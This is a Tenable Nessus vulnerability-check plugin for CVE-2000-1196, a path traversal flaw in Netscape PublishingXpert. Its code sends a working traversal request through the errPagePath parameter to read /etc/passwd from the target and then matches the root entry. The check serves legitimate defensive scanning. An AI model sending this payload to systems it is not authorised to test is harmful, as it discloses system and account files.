#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(10364);
  script_version("$Revision: 1.23 $");
  script_cvs_date("$Date: 2016/11/23 20:31:33 $");

  script_cve_id("CVE-2000-1196");
  script_osvdb_id(278);

  script_name(english:"Netscape PSCOErrPage.htm errPagePath Parameter Traversal Arbitrary File Access");
  script_summary(english:"Checks if /PSUser/PSCOErrPage.htm reads any file");

  script_set_attribute(attribute:'synopsis', value:
'The remote service is vulnerable to an information disclosure flaw.');
  script_set_attribute(
    attribute:'description',
    value:
"The '/PSUser/PSCOErrPage.htm' CGI allows a malicious user to view any
file on the target computer by issuing a GET request :

  GET  /PSUser/PSCOErrPage.htm?errPagePath=/file/to/read"
  );
  script_set_attribute(attribute:'solution', value:"Upgrade to Netscape PublishingXpert 2.5 SP2 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_attribute(attribute:'see_also', value:'http://packetstormsecurity.org/0004-exploits/ooo1.txt');

  script_set_attribute(attribute:"vuln_publication_date", value:"2000/04/06");
  script_set_attribute(attribute:"plugin_publication_date", value:"2000/04/12");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe",value:"cpe:/a:netscape:publishingxpert");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2000-2016 Tenable Network Security, Inc.");
  script_family(english:"CGI abuses");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

w = http_send_recv3(method:"GET", item:"/PSUser/PSCOErrPage.htm?errPagePath=/etc/passwd", port:port);
if (isnull(w)) exit(1, "The web server on port "+port+" did not answer");
result = strcat(w[0], w[1], '\r\n', w[2]);
if (egrep(pattern:".*root:.*:0:[01]:.*", string:result))
  security_warning(port);
